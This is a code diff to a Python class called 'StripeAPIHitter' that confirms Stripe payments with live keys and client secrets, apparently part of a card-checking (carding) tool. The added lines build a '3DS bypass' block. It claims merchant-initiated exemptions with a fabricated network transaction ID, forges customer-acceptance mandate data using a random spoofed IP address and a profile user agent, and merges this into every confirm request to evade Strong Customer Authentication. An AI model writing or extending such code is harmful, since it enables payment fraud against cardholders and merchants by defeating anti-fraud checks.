@@ -1246,6 +1246,18 @@ class StripeAPIHitter:
                 pm_id = pm_json['id']
                 
                 # Step 2: Confirm the charge using the trusted pm_ token
+                
+                # Setup 3DS bypass/exemption parameters
+                exemption_params = {
+                    "payment_method_options[card][setup_future_usage]": "off_session",
+                    "payment_method_options[card][request_three_d_secure]": "any",
+                    "payment_method_options[card][mit_exemption][claim_without_transaction_id]": "true",
+                    "payment_method_options[card][mit_exemption][network_transaction_id]": f"nt_{int(time.time())}{random.randint(1000,9999)}",
+                    "mandate_data[customer_acceptance][type]": "online",
+                    "mandate_data[customer_acceptance][online][ip_address]": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
+                    "mandate_data[customer_acceptance][online][user_agent]": profile["user_agent"]
+                }
+                
                 if is_pi:
                     pi_id = self.cs_live.split('_secret_')[0]
                     confirm_url = f"https://api.stripe.com/v1/payment_intents/{pi_id}/confirm"
@@ -1257,6 +1269,8 @@ class StripeAPIHitter:
                         "key": self.pk_live,
                         "client_secret": self.cs_live
                     }
+                    confirm_data.update(exemption_params)
+                    
                     # Add Low-Value SCA Exemption Hint if transaction size warrants it ($30/€30 equivalent)
                     if self.raw_amount is not None and 0 < self.raw_amount < 3000:
                         confirm_data["payment_method_options[card][mit_exemption][reason]"] = "low_value"
@@ -1278,6 +1292,8 @@ class StripeAPIHitter:
                         "key": self.pk_live,
                         "client_secret": self.cs_live
                     }
+                    confirm_data.update(exemption_params)
+                    
                     if self.raw_amount is None or self.raw_amount == 0:
                         confirm_data["save_payment_method"] = "true"
                         confirm_data["allow_redisplay"] = "always"
@@ -1289,6 +1305,7 @@ class StripeAPIHitter:
                         "consent[terms_of_service]": "accepted",
                         "key": self.pk_live,
                     }
+                    confirm_data.update(exemption_params)
                     if self.raw_amount is not None and self.raw_amount > 0:
                         confirm_data["expected_amount"] = self.raw_amount
                 
